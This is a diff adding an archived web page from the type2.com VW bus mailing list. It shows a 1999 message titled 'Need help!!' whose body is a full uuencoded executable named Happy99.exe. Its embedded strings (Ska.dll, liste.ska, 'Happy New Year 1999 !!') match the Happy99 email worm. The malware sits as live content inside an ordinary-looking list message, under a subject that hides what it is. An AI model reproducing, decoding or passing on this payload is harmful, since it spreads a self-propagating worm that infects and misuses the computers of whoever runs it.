@@ -1,0 +1,436 @@
+<html>
+<head>
+<title>type2 - Need help!!</title>
+<meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+<meta name=viewport content="width=device-width, initial-scale=1" />
+<link rel="apple-touch-icon" sizes="57x57" href="/apple-icon-57x57.png">
+<link rel="apple-touch-icon" sizes="60x60" href="/apple-icon-60x60.png">
+<link rel="apple-touch-icon" sizes="72x72" href="/apple-icon-72x72.png">
+<link rel="apple-touch-icon" sizes="76x76" href="/apple-icon-76x76.png">
+<link rel="apple-touch-icon" sizes="114x114" href="/apple-icon-114x114.png">
+<link rel="apple-touch-icon" sizes="120x120" href="/apple-icon-120x120.png">
+<link rel="apple-touch-icon" sizes="144x144" href="/apple-icon-144x144.png">
+<link rel="apple-touch-icon" sizes="152x152" href="/apple-icon-152x152.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-icon-180x180.png">
+<link rel="icon" type="image/png" sizes="192x192"  href="/android-icon-192x192.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="96x96" href="/favicon-96x96.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<meta name="msapplication-TileColor" content="#ffffff">
+<meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
+<meta name="theme-color" content="#ffffff">
+<link rel="stylesheet" href="/css/bootstrap.min.css" />
+<link rel="stylesheet" href="/css/social.css"/>
+<link rel="stylesheet" href="/css/bootstrap-social.css"/>
+<script src="https://kit.fontawesome.com/d43644abd1.js" crossorigin="anonymous"></script>
+<style>
+    .jumbotron { background-image: url("/images/volkswagen-149048_1280.png");
+                 background-repeat: no-repeat;
+                 background-position: center;
+                 }
+</style>
+
+
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+</head>
+<body>
+<!-- /lists/type2/oldarchive/message/677738 -->
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.4";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+  <nav class="navbar navbar-default navbar-fixed-top">
+
+  <div class="container-fluid">
+    <!-- Brand and toggle get grouped for better mobile display -->
+
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse"
+              data-target="#bs-type2-navbar-collapse-1" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+
+          <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+        </button>
+      <a class="navbar-brand" href="/">
+        <img class="img-responsive" alt="type2.com" style="margin-top: -14px" width="75" src="/images/type2.png"/></a>
+    </div><!-- Collect the nav links, forms, and other content for toggling -->
+
+    <div class="collapse navbar-collapse" id="bs-type2-navbar-collapse-1">
+      <ul class="nav navbar-nav">
+        <li class=""><a href="/">Home <span class="sr-only">(current)</span></a></li>
+        <li class=""><a href="/airs/main.html">AIRS</a></li>
+
+        <li class="dropdownactive">
+          <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true"
+             aria-expanded="false">Mailing Lists</a>
+
+          <ul class="dropdown-menu active">
+            <li><a href="/lists/vintagebus/main.html">Vintage Bus (1949-1967)</a></li>
+
+            <li><a href="/lists/type2/main.html">Type2 (1968-1983)</a></li>
+
+            <li><a href="http://gerry.vanagon.com">Vanagon (1980-1991)</a></li>
+
+            <li><a href="http://gerry.vanagon.com">Eurovan (1992-2003)</a></li>
+
+          </ul>
+        </li>
+        <li class="dropdown">
+          <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true"
+             aria-expanded="false">Tech Libraries</a>
+
+          <ul class="dropdown-menu">
+            <li><a href="/library/type2/library.htm">Type2 Library</a></li>
+
+            <li><a href="/library/bartnik/tech1.htm">Bartno Tek</a></li>
+
+            <li><a href="/library/nesstek/index.htm">Ness-Tek</a></li>
+
+
+          </ul>
+        </li>
+  <li class=""><a href="/donate.html">Donate</a></li>
+      </ul>
+      <form class="navbar-form navbar-right" role="search" name="sitesearch" method="POST" action="/search">
+        <div class="form-group">
+    <input type="text" class="form-control" placeholder="Search" name="search" id="search"/>
+  </div>
+  <button type="submit" class="btn btn-default" onclick="document.getElementById('sitesearch').submit();">Go</button>
+      </form>
+    <ul class="nav navbar-nav navbar-right">
+        
+        <li><a href="/login?returnurl=/lists/type2/oldarchive/message/677738" title="Login">Login</a></li>
+        <li><a href="/login/register?returnurl=/lists/type2/oldarchive/message/677738" title="Login">Register</a></li>
+    </ul>
+    </div><!-- /.navbar-collapse -->
+  </div><!-- /.container-fluid -->
+  </nav>
+  <div class="container" role="main">
+<ul class="nav nav-pills">
+  <li role="presentation"><a href="/lists/type2/main.html">List Introduction</a></li>
+  <li role="presentation"><a href="/lists/type2/charter">List Charter</a></li>
+  <li role="presentation" class="active"><a href="/lists/type2/oldarchive/main.html">Archives (Pre June 2013)</a></li>
+  <li role="presentation"><a href="/lists/type2/archive/index.html">Archives (2013-Present)</a></li>
+  <li role="presentation"><a href="/lists/type2/listinfo">Subscribe</a></li>
+</ul>
+<p>
+<form method="post" id="searchform" action="/lists/type2/oldarchive/search/0/0">
+<div class="input-group">
+      <input name="search" type="text" id="search" class="form-control" placeholder="Search for...">
+      <span class="input-group-btn">
+        <button class="btn btn-default" type="button" onclick="document.getElementById('searchform').submit();">Go!</button>
+      </span>
+    </div><!-- /input-group -->
+</form>
+</p>
+
+
+
+
+
+
+
+   <h1>Need help!!</h1>
+   <b>Yoshiyasu Ito &lt;yasu_at_mozart.inet.co.th&gt;</b><br/>
+   <i>1999-06-11 07:36:56+00</i><br/>
+   <br/>
+   <pre>begin 644 Happy99.exe
+M35I0``(````$``\`__\``+_at_`````````0``:````````````````````````
+M``````````````````````$``+H0``X?M`G-(;_at_!3,TAD)!4:&ES('!R;V=R
+M86T_at_;75S="!B92!R=6X_at_=6YD97(_at_5VEN,S(-"B0W````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M`````````````````````````````````````````%!%``!,`00`GR77C_at_``
+M````````X`"._at_0L!`AD`"_at_```!8```````````$````!`````_at_```$`````!
+M```"```!``````````,`"_at_`````````%```$`````````_at_``````$```(```
+M```0```0````````$``````````````````#`$`#````````````````````
+M``````````````````0`:`$`````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````0T]$10``````$``````!```*````!_at_``````````````````
+M(```8$1!5$$``````!```````_at_``$````!```````````````````$```,`N
+M:61A=&$````0``````,```0````_at_``````````````````!```#`+G)E;&]C
+M````$``````$```"````)```````````````````0```4```````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````:`!X``!J0.C6"```A<`/A!T&``!0O^L.0_at_"K!6!M``"K!<_at_```"K
+M6%!04%^XE````*OHMP_at_``%Z#QA"M_at___at_`#X3L!0``OLD-0_at_!67[F5````K/;0
+MJN+Z:,_at_```#_->\.0_at_#HC0_at_``(7`#X2W!0``H_<.0_at_!HR````/\U\PY"`&H`
+MZ%8(``"%P`^$F`4``(LU\PY"``/P_at_^X%K"3?/$%U"L<%B_at_]"`/____^^(PY"
+M`(L][PY"``,]]PY"`+D)````\Z1J`?\U[PY"`/\U\PY"`.CO!P``O_at_``0_at_"+
+M/>L.0_at_"M/45.1"!T%3U:15)/=`7WT*OK[*V+R#/`\ZOKXXO/*PWK#D(`B0W[
+M#D(`OAH.0_at_"+/>\.0_at_`#/?<.0_at_"Y"0```/.D,\!0:(````!J`E!0:````$#_
+M->\.0_at_#HNP<``$`/A.L$``!(H_\.0_at_!J`&C[#D(`_S7[#D(`_S7K#D(`_S7_
+M#D(`Z$('``"%P`^$M`0``+X-#D(`BSWO#D(``SWW#D(`N0T```#SI(LU[PY"
+M`(L]\PY"`(L-]PY"`(/!"?.DN'-K80"K:_at_'_-?,.0_at_#_->\.0_at_#H"_at_<``#/`
+M4&B`````:_at_-04&_at_```#`_S7O#D(`Z"0'``!`=5(SP/\UZPY"`&_at_'#T(`4&_at__
+M`!\`4%!0:"P.0_at_!H`_at_``_at_._at__at_!P``N`_at_```!0N",.0_at_!`4&H!:_at_!0_S4'#T(`
+MZ/T&``#_-0</0_at_#H__at_8``.G[`P``2*->#D(`,\!04%!J!%#_-5X.0_at_#HI`8`
+M`(7`#X3/`P``HV8.0_at_`SP%!04&H&_S5F#D(`Z*D&``"%P`^$I0,``*-J#D(`
+MB_!F_at_3Y-6_at_^%DP,``(!^$GH/A(D#``#&1A)Z`W8\9H$^4$4/A7<#``")-7(.
+M0_at_!FBT8&9J-V#D(`,\EFBPUV#D(`9HM&%&:C>`Y"`(O>_at_\,8,\!F`P5X#D(`
+M`]B+`STN=&5X=",]+F5D870//2YD871T68/#*$EUX^M>BT,,*T,4HWH.0_at_#K
+MY/=#)"```&`/A"P#``"!2R0```"`B1V>#D(`BT,0BWL(*\<]R_at_````^"#`,`
+M`(M##(M3%"O"HWX.0_at_`#UXD5D_at_Y"`.N9BT,,*T,4HX(.0_at_#KFK^&#D(`BQ5Z
+M#D(`BUYXBS5J#D(`*]H#WHM#'"O"`\:KBT,_at_*\(#QJN+0R0KP_at_/&JXM+&#/2
+MBS6*#D(`QP6B#D(``````(L>*QUZ#D(``QUJ#D(`BP,]8V]N;G0_at_/7-E;F1T
+M8D*#Q_at_1)==N#/:(.0_at_`"#X5Q`_at_``Z9(```"#PP2+`SUE8W0`==M25HL=C_at_Y"
+M`-'B`]HSP&:+`XLUA_at_Y"`,'_at_`_at_/PBP:CE_at_Y"`*&2#D(``P5^#D(`_at_\``B0;_
+M!:(.0_at_!>6NN>_at_\,$B_at_,\`'654E:+'8X.0_at_#1X_at_/:,\!FBP.+-88.0_at_#!X`(#
+M\(L&HYH.0_at_"AD_at_Y"``,%?_at_Y"`(/`1XD&_P6B#D(`7EKI5?___XLUG_at_Y"`(%&
+M",H```!HJ_at_Y"`.A0!```A<`/A)H!``"CI_at_Y"`&BW#D(`_S6F#D(`Z#\$``"%
+MP`^$?0$``*/?#D(`:,0.0_at_#_-:8.0_at_#H(_at_0``(7`#X1_at_`0``H^,.0_at_!HT`Y"
+M`/\UI_at_Y"`._at_%!```A<`/A$,!``"CYPY"`(L]D_at_Y"``,]:_at_Y"`.C*````G&#H
+M`````%^!Q[T```"+7"0LBD,#/!EU"(M$)"BJ1^L*/'=U&T>+1"0HJN_at_(````
+M4VMA+F1L;`"X_______0JV&=Z0````"<8._at_`````7H/&=F:MBUPD*#KC=!`Z
+MPW0"ZUOH#P```&UA:6P`Z`4```!N97=S`*U0N/______T(7`=#K_T#P!=#1F
+MD^_at_`````7H/&-%9?,\"`^TYU"D>JK#P`=1E&ZPV`^TUU$:I'1JP\`'4)K5"X
+M_______089WI`````````````%ZYR_at_```/.DH=\.0_at_")AV____^AYPY"`(E'
+MKZ'C#D(`B4?MBQ5^#D(`H9(.0_at_`#PH/`1BL%E_at_Y"`/?0B8=Y____H9(.0_at_`#
+MP_at_7#````*P6:#D(`]]")1_;_-6H.0_at_#HH_at_(``/\U9_at_Y"`.CE`_at_``_S5>#D(`
+MZ-H"``#_->L.0_at_#HU0(``(,]B_at_]"``!T!VK_Z(\"``!H``("`&I`Z)4"``"C
+MZPY"`&H`Z&4"``"C?_at_]"`*,;#T(`N.<'00"C#P]"`,<%+P]"`&</0_at_!H"P]"
+M`.BO`_at_``,\!0_S5^#T(`4%!H``(``&_at_``0``:F1J9&_at_```P`:&</0_at_!H9P]"
+M`%#HI0(``*."#T(`:_at_'_-8(/0_at_#HF0(``/\U_at__at_]"`.B4`_at_``_S6"#T(`Z&L"
+M``"C8P]"`#/`:_at_%04%!H,P]"`.A/`_at_``A<`/A;,```"A4P]"`(/_at_#Z-3#T(`
+M_at___at_`#X0!`0``N0`0``"+->L.0_at_!15E^#QQ2+1_at_BKBT8,JX$&`!```*T!1_at_2M
+M`48$K<'X$(O0K<'X$(O8K8/X`'4%_at_\8(ZTF`;OP!<P3&1OP`_at_&[]`7,$QD;]
+M`(!N__at_%S!,9&__at_!64%)3_S5C#T(`Z/8!``!>K<'X$(O0K<'X$%9J`%)0_S5C
+M#T(`Z-L!``!>_at_\8$64D/A7G_____!5,/0_at_#I-/___X,]-P]"`!)T%K_at_S#T(`
+M4%#HJ0$``.B&`0``Z17_____-6,/0_at_#_-8(/0_at_#H4_at_$``,<%B_at_]"`/_____I
+M/_[__UBCA_at_]"`(-\)`0"=0MJ`._at_[`0``,\#K!>A*`0``BPV&#T(`4<.A3P]"
+M`(/_at_#Z-/#T(`P>`-BSWK#D(``_BY``$``.AF````P>_at_(HUL/0_at_#H60```,'H
+M"*-7#T(`Z$P```#!Z`_at_-#P^O`(O8Z#T```#!Z`^)!XE/!-M'!-G^V_at__;1P39
+M_]H/VQ_;7P2#QPBA5P]"`*NA6P]"`*N+PZN#QPSBR?\%3P]"`.EW_O__N!-`
+M(0#W+5\/0_at_`KT_at_41$%,"HU\/0_at_##_R5D`$,`_R5H`$,`_R5L`$,`_R5P`$,`
+M_R5T`$,`_R5X`$,`_R5\`$,`_R6``$,`_R6$`$,`_R6(`$,`_R6,`$,`_R60
+M`$,`_R64`$,`_R68`$,`_R6<`$,`_R6_at_`$,`_R6D`$,`_R6H`$,`_R6P`$,`
+M_R6T`$,`_R6X`$,`_R7``$,`_R7$`$,`_R7(`$,`_R7,`$,`_R70`$,`_R74
+M`$,`_R78`$,`_R7<`$,`_R7_at_`$,`_R7D`$,`_R7H`$,`_R7P`$,`````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M`+*EK__]____^__P_P``__]'_________[__Y?]:15)/"````/_^__]%[__Q
+MX$OV,MY'_K,RWF]OJY>6C-^/C9"8C9Z2WY**C(O?G9K?C8J1WXJ1FYJ-WZB6
+MD<S-\O7;R%I%4D\B````K[K__[/^^O]_at_VBIQ6D523P(````?_W%>]/[]YO_U
+M____]____________O____[____]____O_____[___W___[__________/_U
+M__________G___O________]____6D523P(```#__^___^_________O____
+M___[_Z________S_D_[__UI%4D\&````___Z_Q/___]:15)/%````+RPN[K_
+M_____^_______O__]?____G__UI%4D\#````W___G[N^J[[______^______
+M_?___?___^___UI%4D\#````O___/]&6FYZ+GO___^_______/___?___^W_
+M_UI%4D\#````O___/]&:FYZ+GO___^______^____?___^O__UI%4D\#````
+MO___O]&-FI.0G/___^______^O___?___^G__UI%4D\#````O___KUI%4D_0
+M````?(/;]_^+LGR#V_?^B_T4L$'#_[W_J:!&RO___U,)+U4=!9?_W___E;\7
+M9_?__WH_BOO,/Q310&;_O?]4^D?T__]4^D?T__]4^A?\__]4?#^;5!3T`,IF
+M_[W_%Y+W__]'_O___SWS_Q>4^O__?`:;\'AU____=/S:("`_at_(,*ROK:SBLUT
+MO/O:`"`_at_(,+?N:VPBMR9=+SWF=H_at_`)G"LL6*ZG0,=,)>_[W_=O+__[W_#%L6
+M_at_/[__W3\VB`_at_("#"K;ROJXK(=+S[V_at_`_at_(`#"WZNPQ8K7%T_X__]V\OO_O?\7
+M(O[__WP'__![MO[__SCZ:O^]_P`````6SO[__Q;*_O__%\'\__]\!__P>MC^
+M__]TRF+_O?^94IG"___P>^K^__]\PFK_O?__\'H*____%U#[__]>?O^]_W3B
+M9O^]_Q>6^___?`<`\'L/____%T_[__]'^O___T3E_[W_%[/[__]\!P#P>RS_
+M__\7!_G__\+-RL_?\'H\____1_G___]$]_^]_Q?;^___?`<`\'M4____%R_Y
+M___"S<K/W_!Z9/___U[__[W_=.)>_[W_%P3\__]\!P#P>WW___\76/G__\+-
+MRL_?BHETRF+_O?]TZE[_O?]\%<W,-G014[[$#8BBP_^+W\/UB_at_UT/G0B%T/\
+M__]\!P"+N!>3^?__PLW*S]^*Q!0M1_G___]$\?^]_Q=E_/__?`<`B]H7M?G_
+M_\+,RLO?BN8X^FK_O?______=,)B_[W_S#]41_[___\\1[*RLK(\%VW\__]\
+M!IN-EA<,_O__?`?_BJ`7>/S__UY^_[W_=.)F_[W_%[[\__]\!P"+M!=S_/__
+M1_K___]$Y?^]_Q?7_/__?`<`B\T7)_K__\+-R\_?BME'^?___T3K_[W_%_?\
+M__]\!P"+[1='^O__PLS+S]^*^4?^____/$>QL;&Q/)]T%)6;`,I6_[W_%P[Z
+M__]Z/_![F/[__UR"_[W_09G_O?]TPE;_O?_\PH+_O?]&]/___PQ;E?^7?___
+M_Y7[E?^5_Y?___\_`,I6_[W_%QKZ__^_\'O9_O__MUR*_[W_E\WK__^5OQ=C
+M^O__>C_P>_[^__]<>O^]_Y7_EX;_O?^7_^O__P#*>O^]_P#*BO^]_Q>!^O__
+M>C_P>QW___]^PH;_O?__Z___C<_at_`RHK_O?\7=OK__Y7_EW____^5_97_E?^7
+M____/P#*5O^]_Q>9^O__O_![6/___[=<BO^]_Q1G=`I\.?=2="=2="]TRGK_
+MO?]T,?SRAO^]_U+$/(O]%/=2Q#V+N'P1^WP1_)E2Q`Z,]IG"\O6+';$4#G0!
+M=`I\.?=T\OO_O?]\%O>NJ`Q;F4?R]9E4H*:5_Y>&_[W_KJ_at_`RHK_O?\7'OO_
+M_Q3B`,IZ_[W_%TG[__\`RHK_O?\7)/O__YY'`````#P`RGK_O?\79OO__P#*
+MBO^]_Q=!^___GLP_/)]T#'0!_`9T,'P^F\PMF73AF7X<("!T$9E^!+FMB[ET
+M"IE^!*RJBZQT"IE^!+&ZBX]T"IE^!+R\\'MF____=`J9?_at_2]O/![5O___W0*
+MF7X$\O7P>T;___]T"KG$#O!\&____Q16F5)2VB`_at_``#"L++%WXI4%RK___\4
+M;)E24MH_at_("`_at_PKVUNKR*85+:(```_\*KQ=__BFX73?___Q:2````F5)2VB`_at_
+M("#"J*RXK8I^4MH_at_("`_at_PK"JKZSP>H\```"94IG"Q=_P>IL````7_at_____Q;(
+M````F5)2V_at_``___"Q=____!ZJP```!>_at_____%N4```"94E+:(```_\*\Q=__
+M\'J[````%[W___\6`_at_$``%+"\O7R]?!ZQ````*]'I]*LCU1'GI&,E%1'GL7?
+MIE291YJ,F51\/?&G5+V]=NI^_[W_GLP_/)Y'`````#QT"G3"9O^]__P%4U6]
+M?_at_5Y]/__B/O#]8H./'07E?^OK`#*<O^]_P#J=O^]_WP'`(KJ%Q']___"S-C_
+M_XK[=#H4)$<`````/'2CV\MTL]O'/'2CV\]VXG+_O?^GI*RO?#S$=/S\)WP\
+M^W;B=O^]_SR7_Z___Y6_%T3]__]Z/_![K_W__UQZ_[W_E9L`RE;_O?\79/W_
+M_WH_\'O4_?__7(+_O?]!HO^]_W3"5O^]__S"_at_O^]_T;V____#%N5_Y=_____
+ME?R5_Y7_E____W\`RE;_O?\7</W__[_P>Q7^__^W7([_O?^7V/^]_P#*CO^]
+M_Q>3_?__O_![/?[__[=<V/^]_Y7_E?^5_Y7]E?\`RH[_O?\7Z_W__WH_\'M_at_
+M_O__7.#_O?^5_Y7_E?^5^P#*X/^]_Q?M_?__>C_P>XO^__]<W/^]_T'#_[W_
+M=,)Z_[W_1N;___\,6\PM7MC_O?^OF432_YD(#,PVF70W=O+4_[W_=^K0_[W_
+M=,K<_[W_HOP1=.K4_[W_3[)51O#____$"HK[S3\4_E-U'S\7_=O`BOW[O_O?
+M574[/Q_[V\]U!\0*BOO-/Q3^4W4?/Q?[V_#U.-O`BOW[O_O?574[/Q_]VP-U
+M!\0*BOO-/Q3^4W4?/Q?YV_SU.-O`BOW[O_O?574[V\"*_?N_^]]5MHILF4?R
+M]9E4M8I]7]#_O?_#_XO4^]]5S#_,+<PV7]#_O?],_`D,=3=[&XO]F;Y%_O__
+M_SGZT/^]__\6J0```$&J_[W_1O?___\,6W0PU/)Z_[W_=O+'_[W_S"W,-E['
+M_[W_F407_)D(#)ET-W;RS_^]_W;JR_^]_W3*>O^]_P#ZS_^]_T(7_/__?,+/
+M_[W__HKY=-++_[W_=#IT(1=]`_at_``?`<`B_7\"_at_#RS_^]_XHK`,K<_[W_%UW_
+M__\`RN#_O?\74/___P#*CO^]_Q=;____`,IZ_[W_%Y;___\\E?^5PP#*6O^]
+M_P#*<O^]_Q?*____?`<`BQETXEK_O?]T_#R?=,IB_[W_="E^/:OT__]3Q`V,
+M[L/_B_at_BQ=`%T#`Q;1_____]4GCP`VL/_O/\`VK__O/\`VK?_O/\`VK/_O/\`
+MVJ__O/\`VJO_O/\`VJ?_O/\`VJ/_O/\`VI__O/\`VIO_O/\`VI?_O/\`VI/_
+MO/\`VH__O/\`VHO_O/___UI%4D]!````K:RZJ_+UN[ZKOO+UK["LJ_+U\O71
+M\O7_6D523P<````-"F)E9VEN(#8T-"!(87!P>3DY+F5X90T*8`T*96YD#0I<
+M4VMA+F5X90!<;&ES=&4N<VMA`/___UI%4D]F````_at___\_\/__/]:15)/`P``
+M`'?__/^W__S_6D523P4```!I__S_8?_\______]/__S_.?_\_R/__/\5__S_
+M"?_\__W^_/_M_OS_V_[\_\G^_/^]_OS_K_[\_Z'^_/______J*RPO+3,S=&;
+MDY/_M+JML;JSS,W1FY.3_____XV:G(G_____J*R^N)J+LYZ,B[J-C9"-____
+MO(V:GHN:N9:3FK*>CX^6D9B^_____[B:BZR&C(N:DKN6C9J<BY"-AK[___^S
+MD)R>D[Z3DY"<_____[.0G)Z3N8V:FO___ZV:GINYEI.:_____[*>CZF6FHBP
+MF;F6DYK___^LFHNYEI.:KY"6D8N:C?____^JD9*>CZF6FHBPF;F6DYK___^H
+MC9:+FKF6DYK___^XFHNYEI.:K):%FO___[R-FIZ+FKF6DYJ^____O).0C)JW
+MGI&;DYK_6D523R_at_```##__O__O____W____]____U__[_\__^__'__O_F/_^
+M_[_]_O^Y__O_M/_[_____O^2GIN3D]&[L[/_DIZ6D_^1FHB,_UI%4D]L````
+M___^_Q/____NS\C/J<];SU7/)L\2S_#.WL[-SL?.JLZ"SE_.6<XYSC/.^,W<
+MS=+-I<V?S8;-9LTYS2?-(LT<S1;-]\SES,S,Q<RZS+3,H<R5S'C,9LQ3S$O,
+M'<P'S/_+\LOGR]7+RLM^RFO*3<I'RAG*!<KKR>/)T<G,R<;)P,FAR8_)BLF$
+MR7+)8LE0R4+),,DKR27)%\D$R?[(^,COR&S(6LA#R#C(*<_at_CR!K("L_at_$R/['
+M^,?MQ^3'SL?&Q[O'L,>EQY7'C\=_QW7'3\=)QT/'/<<WQS''*\<EQQ_'&<<3
+MQPW'!\<!QUI%4D]&`_at_``14Y$(`"VC-^6B]^>WXF6C8J,T]^>WXB0C9+3WY[?
+MBXV0E9Z1P-^RL*JKTK*PJJO?MX:=C9:;W]><UM^LCYZ1C)2>W\[&QL;1_Z.(
+MC)"<E,S-T9N3D_^CK)2>T9N3D_^CK)2>T9J'FO^LD)F+B)Z-FJ.REIR-D(R0
+MF8NCJ):1FY"(C*.\BHV-FI&+J9J-C):0D:.MBI&PD9R:_P``````````````
+M````````````````````````````````````````````````````````````
+M``````````````````````````!+15).14PS,BYD;&P`3&]A9$QI8G)A<GE!
+M`$9R965,:6)R87)Y`$=E=%!R;V-!9&1R97-S````````````````````````
+M`````````````````````````````````````T``````````````````````
+M``````````````<`````````````````````````````````````````````
+M````````````````````````````$;NJ_P````!(87!P>2!.97<_at_665A<B`Q
+M.3DY("$A````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M``````````````````#X``,`9``#``````````````````4!`P"P``,`````
+M````````````$_at_$#`,```P`````````````````=`0,`\``#````````````
+M````````````````*`$#`#0!`P!&`0,`7_at_$#`'(!`P!^`0,`D`$#`)X!`P"L
+M`0,`P_at_$#`-`!`P#F`0,`]_at_$#``P"`P`:`_at_,`*`(#`#0"`P!$`_at_,``````%`"
+M`P!B`_at_,`=`(#``````""`_at_,`C_at_(#`*`"`P"R`_at_,`P_at_(#`,H"`P#>`_at_,`\`(#
+M``(#`P`0`P,`(`,#```````T`P,``````$M%4DY%3#,R+F1L;`!!1%9!4$DS
+M,BYD;&P`55-%4C,R+F1L;`!'1$DS,BYD;&P`````5W)I=&5&:6QE````56YM
+M87!6:65W3V9&:6QE````1V5T5VEN9&]W<T1I<F5C=&]R>4$`````1V5T36]D
+M=6QE2&%N9&QE00````!#;W!Y1FEL94$```!'9710<F]C061D<F5S<P````!%
+M>&ET4')O8V5S<P```$=E=$9I;&53:7IE````1V5T36]D=6QE1FEL94YA;65!
+M`````$QO8V%L06QL;V,`````0W)E871E1FEL94UA<'!I;F=!`````$=E=%9E
+M<G-I;VY%>$$```!'9713>7-T96U$:7)E8W1O<GE!````0W)E871E1FEL94$`
+M``!#;&]S94AA;F1L90```$QO8V%L1G)E90```$UA<%9I97=/9D9I;&4```!2
+M96%D1FEL90````!296=3971686QU945X00````!296=#<F5A=&5+97E%>$$`
+M``!296=#;&]S94ME>0```%)E;&5A<V5$0P```%)E9VES=&5R0VQA<W-!````
+M`%!O<W11=6ET365S<V%G90```%!E96M-97-S86=E00````!'971$0P```$1I
+M<W!A=&-H365S<V%G94$`````1&5F5VEN9&]W4')O8T$`````0W)E871E5VEN
+M9&]W17A!````4VAO=U=I;F1O=P````!5<&1A=&57:6YD;W<`````5')A;G-L
+M871E365S<V%G90````!39710:7AE;%8`````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M```````````````````````````````````````````````````!`&_at_!```6
+M,$8P7C!P,'LPD#"B,*LPL3"W,,8PS##6,-PP`3$',0PQ$C$8,38Q2#%/,54Q
+M6S%A,7,Q>3%_,8PQDC&8,:LQL3'-,=TQXC'P,04R$C(=,BTR.S)-,EHR;#*;
+M,J4RKC*X,L8R\C(.,RXS-C-#,THS4#-9,X`SAC.2,Y_at_SM3/5,^0S\#/U,_LS
+M!C0;-"HT-C0[-$$T3#19-&4T=S1\-((TE#29-)\TL32V-+PTSC34--HTMC7!
+M-<DUTC77->(U[S7\-0<V$C8=-B_at_V9#8S-DXV6C9?-FDV;S9S-G_at_VAC:_at_-J4V
+ML#:X-L,VSC;8-N0V]C;^-A(W;3>(-Y\WJC>R-\DWSS?:-^DW!C_at_-.!4X'C_at_R
+M.#\X=CA\.(LXFSBG.*XXM#BZ.,`XQCC,.-(XV#C>..0XZCCP./8X_#_at_".0_at_Y
+M#CD4.1HY(#DF.2PY,CDX.3XY1#E*.5`Y5CE<.6(Y:#EN.0``````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+*````````````````
+`
+end</pre>
+
+
+<script type="javascript">
+  $( $("#search").click(function () {
+    $("#searchform").submit();
+  });
+   );
+  </script>
+
+  </div>
+<!--
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- type2_main
+<ins class="adsbygoogle"
+     style="display:block"
+          data-ad-client="ca-pub-3785913025356437"
+         data-ad-slot="7516194300"
+              data-ad-format="auto"></ins>
+        <script>
+        (adsbygoogle = window.adsbygoogle || []).push({});
+        </script>
+<br/>
+-->
+<div class="footer">
+    <div class="container">
+    <br/>
+        <p class="text-muted">
+<!-- Twitter -->
+ <!-- Facebook -->
+<div class="fb-like" data-href="http%3A%2F%2Ftype2.com%2Flists%2Ftype2%2Foldarchive%2Fmessage%2F677738" data-layout="button_count" data-action="like" data-show-faces="true" data-share="true"></div>
+<a href="https://plus.google.com/share?url=http%3A%2F%2Ftype2.com%2Flists%2Ftype2%2Foldarchive%2Fmessage%2F677738" title="Share on Google+" target="_blank" class="btn btn-googleplus"><i class="fa fa-google-plus"></i></a>
+<a href="http://twitter.com/home?status=http%3A%2F%2Ftype2.com%2Flists%2Ftype2%2Foldarchive%2Fmessage%2F677738" title="Share on Twitter" target="_blank" class="btn btn-twitter"><i class="fa fa-twitter"></i></a>
+</p>
+    <span class="pull-right"><img class="img-responsive" width="340px" src="/images/slower2.png" alt="Slower Traffic Keep Right"/></span><br/>
+        <p class="text-muted">
+            <b>In remembrance of <a href="http://www.kristinlaurite.org/" target="top">Kristin Ann Laurite</a>.</b>
+        <br/>
+           For information on type 2 diabetes: <a href="http://www.diabetes.org/type-2-diabetes.jsp" target="top">American Diabetes Association</a>
+        <br/>
+            For help with your Volkswagen Vanagon: <a href="http://gerry.vanagon.com/">vanagon.com</a>
+      <br/>A small army of volunteers help support type2.com. Want to help? <a href="/donate">Click Here</a>
+  <br/>Site Design by <a href="mailto:tyler@type2.com">Tyler Hardison</a>
+        </p>
+    </div>
+</div>
+<script type="text/javascript">/* <![CDATA[ */
+    !window.jQuery && document.write('<script type="text/javascript" src="http://localhost/javascripts/jquery.min.js"><\/script>')
+/* ]]> */</script>
+<script src="/js/bootstrap.min.js"></script>
+
+
+<!-- Google Analytics -->
